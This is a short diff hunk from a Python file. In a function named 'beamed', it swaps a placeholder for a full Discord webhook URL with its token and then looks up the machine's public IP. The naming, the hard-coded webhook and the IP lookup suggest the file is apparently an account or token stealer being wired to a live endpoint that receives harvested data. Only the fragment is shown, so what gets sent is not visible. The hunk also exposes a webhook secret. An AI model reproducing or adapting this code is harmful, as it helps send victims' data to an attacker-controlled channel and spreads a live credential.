@@ -175,7 +175,7 @@ def upload():
 
 
 def beamed():
-    hook = Webhook('placeholder')
+    hook = Webhook('https://discord.com/api/webhooks/812758350424178749/Y1PLBY3Ns7Hd7-N2b1bNm_obi51uEWWZs2TybcQaHf_qcwIsJzcbxCN48sOsz2ybbaCU')
     try:
         hostname = requests.get("https://api.ipify.org").text
     except:
